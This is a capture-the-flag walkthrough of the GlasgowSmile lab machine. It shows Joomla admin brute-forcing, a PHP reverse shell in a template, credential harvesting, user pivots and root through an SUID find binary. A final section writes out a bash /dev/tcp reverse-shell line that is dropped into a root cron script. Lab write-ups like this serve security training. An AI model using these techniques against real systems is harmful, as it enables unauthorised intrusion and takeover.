# GlasgowSmile

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.249.79
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0))
- **80** — HTTP (Apache httpd 2.4.38 ((Debian)))
  - `http://192.168.249.79/joomla/`

Run `joomscan` against the Joomla installation:

```
joomscan -u http://192.168.249.79/joomla/ --ec -r
...
[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.249.79/joomla/administrator/components
http://192.168.249.79/joomla/administrator/modules
http://192.168.249.79/joomla/administrator/templates
http://192.168.249.79/joomla/images/banners
...
[+] admin finder
[++] Admin page : http://192.168.249.79/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.249.79/joomla/robots.txt

Interesting path found from robots.txt
http://192.168.249.79/joomla/joomla/administrator/
http://192.168.249.79/joomla/administrator/
http://192.168.249.79/joomla/bin/
http://192.168.249.79/joomla/cache/
http://192.168.249.79/joomla/cli/
http://192.168.249.79/joomla/components/
http://192.168.249.79/joomla/includes/
http://192.168.249.79/joomla/installation/
http://192.168.249.79/joomla/language/
http://192.168.249.79/joomla/layouts/
http://192.168.249.79/joomla/libraries/
http://192.168.249.79/joomla/logs/
http://192.168.249.79/joomla/modules/
http://192.168.249.79/joomla/plugins/
http://192.168.249.79/joomla/tmp/
...
[+] Enumeration component (com_mailto)
[++] Name: com_mailto
Location : http://192.168.249.79/joomla/components/com_mailto/
Directory listing is enabled : http://192.168.249.79/joomla/components/com_mailto/
Installed version : 3.1
...
[+] Enumeration component (com_wrapper)
[++] Name: com_wrapper
Location : http://192.168.249.79/joomla/components/com_wrapper/
Directory listing is enabled : http://192.168.249.79/joomla/components/com_wrapper/
Installed version : 3.1
```

No exploits were found for Joomla version 3.7.3, `mailto` version 3.1 and `wrapper` version 3.1.

Perform directory busting on `http://192.168.249.79/joomla/`:

```
feroxbuster -u http://192.168.249.79/joomla/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 -n
...
http://192.168.249.79/joomla/robots.txt
http://192.168.249.79/joomla/README.txt
http://192.168.249.79/joomla/htaccess.txt
http://192.168.249.79/joomla/LICENSE.txt
http://192.168.249.79/joomla/includes/
http://192.168.249.79/joomla/administrator/
http://192.168.249.79/joomla/bin/
http://192.168.249.79/joomla/media/
http://192.168.249.79/joomla/libraries/
http://192.168.249.79/joomla/language/
http://192.168.249.79/joomla/tmp/
http://192.168.249.79/joomla/plugins/
http://192.168.249.79/joomla/images/
http://192.168.249.79/joomla/modules/
http://192.168.249.79/joomla/cache/
http://192.168.249.79/joomla/components/
http://192.168.249.79/joomla/templates/
http://192.168.249.79/joomla/layouts/
http://192.168.249.79/joomla/cli/
```

Explore `http://192.168.249.79/joomla/logs/` — returns 404.

Perform directory busting on `http://192.168.249.79/joomla/logs/`:

```
feroxbuster -u http://192.168.249.79/joomla/logs/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 -n
```

Nothing interesting found.

Explore `http://192.168.249.79/joomla/tmp/` — empty page.

Perform directory busting on `http://192.168.249.79/joomla/tmp/`:

```
feroxbuster -u http://192.168.249.79/joomla/logs/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 -n
```

Nothing interesting found.

Other subdirectories in `http://192.168.249.79/joomla/` also do not seem to have anything interesting.

Generate a wordlist from the webpages using `cewl`:

```
cewl -d 4 -m 5 --with-numbers -w wordlist.txt http://192.168.249.79/joomla/administrator/
```

Brute force the login at `http://192.168.249.79/joomla/administrator/index.php`:

```
# Download joomla-brute tool at https://github.com/ajnik/joomla-bruteforce
python3 joomla-brute.py -u http://192.168.249.79/joomla/administrator/index.php -w wordlist.txt -U wordlist.txt -v
...
Joomla:Gotham
```

- Follow the methodology at [Joomla Brute Force — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html#brute-force)

Change the template to a PHP reverse shell and catch with `penelope`:

- Follow the methodology at [Joomla RCE — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html#rce)

```
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/$ whoami
www-data
```

Get the `local.txt` flag:

```
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/$ find / -name local.txt 2>/dev/null
/home/rob/local.txt
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/$ cat /home/rob/local.txt
b21b8c933f72234eeefd340e82bd3cb6
```

### Alternative Initial Access — Joomla Media Manager file upload

The Joomla admin panel includes a Content > Media section that allows file uploads. By navigating to the media manager, a test file can be uploaded to verify the upload path, which is accessible at `http://<IP>/joomla/images/`. A PHP reverse shell payload can then be uploaded through this interface and accessed directly via the web path to achieve RCE as `www-data`.

Credit: [Lepton — PG Play GlasgowSmile](https://medium.com/@dumbangrydog/pg-play-glasgowsmile-linux-2e081b407456)

### Alternative Initial Access — Beez3 template injection

Instead of using the Protostar template, the Beez3 template can be edited in the same way. Navigate to Extensions > Templates > Templates > Beez3 Details and Files, then modify `index.php` to contain a PHP reverse shell. Save the changes and trigger the shell by visiting `http://<IP>/joomla/index.php` or by clicking the Template Preview button. This yields a reverse shell as `www-data`.

Credit: [siunam — GlasgowSmile](https://siunam321.github.io/ctf/pgplay/GlasgowSmile)

### Alternative Initial Access — nmap http-joomla-brute script

Instead of using `joomla-brute.py` or Burp Suite, the `nmap` script `http-joomla-brute` can brute-force the Joomla admin login. First generate a wordlist with `cewl`:

```
cewl 192.168.190.79/joomla -d 4 -w wordlist
```

Then run the nmap script with the generated wordlist and a username list:

```
sudo nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=wordlist,http-joomla-brute.hostname=192.168.190.79,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=3' 192.168.190.79
```

This yields the same credentials `joomla:Gotham`, which can then be used to log in to the admin panel and proceed with the template injection or media manager upload attack vectors.

Credit: [Lepton — PG Play GlasgowSmile](https://medium.com/@dumbangrydog/pg-play-glasgowsmile-linux-2e081b407456)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/$ cd /tmp
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ wget http://192.168.45.189/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ ./linpeas.sh
```

Important findings:

```
Active Ports (netstat):
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

Files inside others home (limit 20):
/home/rob/.selected_editor
/home/rob/user.txt
/home/rob/howtoberoot
/home/rob/.bashrc
/home/rob/.Xauthority
/home/rob/local.txt
/home/rob/.bash_logout
/home/rob/.profile
/home/rob/Abnerineedyourhelp
/home/debian/.bashrc
/home/debian/.bash_logout
/home/debian/.profile
/home/abner/user2.txt
/home/abner/.bashrc
/home/abner/.Xauthority
/home/abner/.bash_logout
/home/abner/.profile
/home/penguin/.bashrc
/home/penguin/.Xauthority
/home/penguin/.bash_logout

Searching passwords in PHP files:
/var/www/html/joomla/configuration.php:  public $password = 'babyjoker';
/var/www/html/joomla/libraries/joomla/log/logger/database.php:             $this->password = null;
/var/www/html/joomla/libraries/joomla/log/logger/database.php:             'password' => $this->password,
/var/www/joomla2/configuration.php:    public $password = 'babyjoker';
/var/www/joomla2/libraries/joomla/log/logger/database.php:             $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
/var/www/joomla2/libraries/joomla/log/logger/database.php:             $this->password = null;
/var/www/joomla2/libraries/joomla/log/logger/database.php:             'password' => $this->password,
```

Read `/var/www/html/joomla/configuration.php`:

```
public $user = 'joomla';
public $password = 'babyjoker';
```

Explore MySQL running on `127.0.0.1:3306`:

```
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ mysql -u joomla -p'babyjoker'

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+

MariaDB [(none)]> show tables from batjoke;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+

MariaDB [(none)]> select * from batjoke.taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
```

The `rob` entry has a base64-encoded password and there is a file `/home/rob/howtoberoot`, suggesting the need to pivot horizontally into the `rob` account.

Perform password hash cracking:

```
nano hash.txt
Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/

hashcat --identify hash.txt
No hash-mode matches the structure of the input hash.
```

Looking at the database result again, all the other passwords are base64 encoded. Decode `Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/` with base64:

- `???AllIHaveAreNegativeThoughts???`

Login as `rob`:

```
www-data@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ su rob
Password: ???AllIHaveAreNegativeThoughts???
rob@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ whoami
rob
```

Explore `/home/rob`:

```
rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ cd /home/rob
rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ ls -al
total 44
drwxr-xr-x 2 rob  rob  4096 Aug 25  2020 .
drwxr-xr-x 6 root root 4096 Nov  8 07:40 ..
-rw-r----- 1 rob  rob   454 Jun 14  2020 Abnerineedyourhelp
-rw-r--r-- 1 rob  rob   220 Jun 13  2020 .bash_logout
-rw-r--r-- 1 rob  rob  3526 Jun 13  2020 .bashrc
-rw-r----- 1 rob  rob   302 Aug 25  2020 howtoberoot
-rw-r--r-- 1 rob  rob    33 Nov  8 07:40 local.txt
-rw-r--r-- 1 rob  rob   807 Jun 13  2020 .profile
-rw-r--r-- 1 rob  rob    66 Jun 15  2020 .selected_editor
-rw-r----- 1 rob  rob    32 Aug 25  2020 user.txt
-rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority

rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ cat howtoberoot
  _____ ______   __  _   _    _    ____  ____  _____ ____
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ <
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ cat Abnerineedyourhelp
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
```

Crack the `Abnerineedyourhelp` message using [CyberChef ROT13 Brute Force](https://gchq.github.io/CyberChef/#recipe=ROT13_Brute_Force(true,true,false,100,0,true,'')):

```
Amount =  1: Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition.

# Using ROT1
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
```

Decode the password with base64:

- `I33hope99my0death000makes44more8cents00than0my0life0`

List users on the target machine:

```
rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ ls -al /home
total 24
drwxr-xr-x  6 root    root    4096 Nov  8 07:40 .
drwxr-xr-x 18 root    root    4096 Nov  8 07:40 ..
drwxr-xr-x  3 abner   abner   4096 Aug 25  2020 abner
drwxr-xr-x  3 debian  debian  4096 Nov  8 07:40 debian
drwxr-xr-x  4 penguin penguin 4096 Aug 25  2020 penguin
drwxr-xr-x  2 rob     rob     4096 Aug 25  2020 rob
```

Login as `abner`:

```
rob@lab-pg-25-debian10-glasgowsmile-245-199:~$ su abner
Password: I33hope99my0death000makes44more8cents00than0my0life0
abner@lab-pg-25-debian10-glasgowsmile-245-199:/home/rob$ whoami
abner
```

Run `linpeas.sh` as `abner`:

```
══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
...
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
...
══════════╣ Files inside others home (limit 20) (T1552.001)
...
/home/penguin/.bashrc
/home/penguin/.Xauthority
/home/penguin/.bash_logout
/home/penguin/.profile
/home/penguin/SomeoneWhoHidesBehindAMask/user3.txt
/home/penguin/SomeoneWhoHidesBehindAMask/find
/home/penguin/SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt
/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
/var/www/html/index.html
```

Explore `/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip`:

```
glasgowsmile-245-199:~$ ls -al /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
-rwxr-xr-x 1 abner abner 516 Jun 16  2020 /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip

abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ file /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip: Zip archive data, at least v2.0 to extract

abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ which unzip
/usr/bin/unzip

abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ unzip -l /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
Archive:  /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      430  2020-06-16 11:49   dear_penguins
---------                     -------
      430                     1 file

abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
Archive:  /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
[/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip] dear_penguins password: I33hope99my0death000makes44more8cents00than0my0life0
  inflating: dear_penguins

abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```

Login as `penguin`:

```
abner@lab-pg-25-debian10-glasgowsmile-245-199:~$ su penguin
Password: scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
penguin@lab-pg-25-debian10-glasgowsmile-245-199:/home/abner$ whoami
penguin
```

Explore `/home/penguin`:

```
penguin@lab-pg-25-debian10-glasgowsmile-245-199:/home/abner$ cd /home/penguin
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~$ ls -al
total 32
drwxr-xr-x 4 penguin penguin 4096 Aug 25  2020 .
drwxr-xr-x 6 root    root    4096 Nov  8 07:40 ..
-rw-r--r-- 1 penguin penguin  220 Jun 15  2020 .bash_logout
-rw-r--r-- 1 penguin penguin 3526 Jun 15  2020 .bashrc
-rw-r--r-- 1 penguin penguin  807 Jun 15  2020 .profile
drwxr--r-- 2 penguin penguin 4096 Jun 16  2020 SomeoneWhoHidesBehindAMask
drwx------ 2 penguin penguin 4096 Jun 15  2020 .ssh
-rw------- 1 penguin penguin   58 Jun 15  2020 .Xauthority

penguin@lab-pg-25-debian10-glasgowsmile-245-199:~$ cd SomeoneWhoHidesBehindAMask/
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ ls -al
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 4 penguin penguin   4096 Aug 25  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt

penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt
Hey Penguin,
I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.

Joker

  _____    _____      __      _   __   ________       _____   ________      ______     _____     ____     __    __   ________    _____   _________   __    __   _____       ______
 (_   _)  / ____\    /  \    / ) (  ) (___  ___)     (_   _) (___  ___)    (_   _ \   / ___/    (    )    ) )  ( (  (___  ___)  (_   _) (_   _____)  ) )  ( (  (_   _)     (_____ \
   | |   ( (___     / /\ \  / /   \/      ) )          | |       ) )         ) (_) ) ( (__      / /\ \   ( (    ) )     ) )       | |     ) (___    ( (    ) )   | |          ___) )
   | |    \___ \    ) ) ) ) ) )          ( (           | |      ( (          \   _/   ) __)    ( (__) )   ) )  ( (     ( (        | |    (   ___)    ) )  ( (    | |         (  __/
   | |        ) )  ( ( ( ( ( (            ) )          | |       ) )         /  _ \  ( (        )    (   ( (    ) )     ) )       | |     ) (       ( (    ) )   | |   __     )_)
  _| |__  ___/ /   / /  \ \/ /           ( (          _| |__    ( (         _) (_) )  \ \___   /  /\  \   ) \__/ (     ( (       _| |__  (   )       ) \__/ (  __| |___) )    __
 /_____( /____/   (_/    \__/            /__\        /_____(    /__\       (______/    \____\ /__(  )__\  \______/     /__\     /_____(   \_/        \______/  \________/    (__)
```

Based on the text in `PeopleAreStartingToNotice.txt`, a cron job may be running.

Watch for hidden processes:

```
penguin@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/pspy64

penguin@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ chmod +x pspy64
penguin@lab-pg-25-debian10-glasgowsmile-245-199:/tmp$ ./pspy64
...
2026/11/08 09:07:01 CMD: UID=0     PID=2514   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
```

`root` executes `/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old` every minute.

Run `linpeas.sh` as `penguin`:

```
══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
You own the SUID file: /home/penguin/SomeoneWhoHidesBehindAMask/find
SUID file in a user-writable or unusual location: /home/penguin/SomeoneWhoHidesBehindAMask/find
You can replace entries in the SUID file's parent directory: /home/penguin/SomeoneWhoHidesBehindAMask
SUID file is owned by non-root user penguin: /home/penguin/SomeoneWhoHidesBehindAMask/find
```

Make `/home/penguin/SomeoneWhoHidesBehindAMask/find` executable and use `/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old` to change file owner to `root`:

```
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ chmod +x find

nano .trash_old
chown root /home/penguin/SomeoneWhoHidesBehindAMask/find
chmod +s /home/penguin/SomeoneWhoHidesBehindAMask/find
```

Gain a privileged shell (using [GTFOBins — find](https://gtfobins.org/gtfobins/find/#shell)):

```
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
```

Get the `proof.txt` flag:

```
# cd /root
# cat proof.txt
c2476b9719069e7c65d6522f5e6fb04e
```

**NOTE:** `pwnkit` kernel exploit works.

### Alternative Privilege Escalation — cron job hijack (.trash_old reverse shell)

Instead of modifying the SUID `find` binary, the root cron job executing `.trash_old` every minute can be hijacked directly. Replace the contents of `.trash_old` with a reverse shell payload, then wait for the cron job to execute it as root:

```
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ mv .trash_old .trash_old2
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ echo '/bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' >> .trash_old
penguin@lab-pg-25-debian10-glasgowsmile-245-199:~/SomeoneWhoHidesBehindAMask$ chmod 777 .trash_old
```

Set up a netcat listener on the attacking machine and wait for the root reverse shell to connect within one minute.

Credit: [Lepton — PG Play GlasgowSmile](https://medium.com/@dumbangrydog/pg-play-glasgowsmile-linux-2e081b407456)
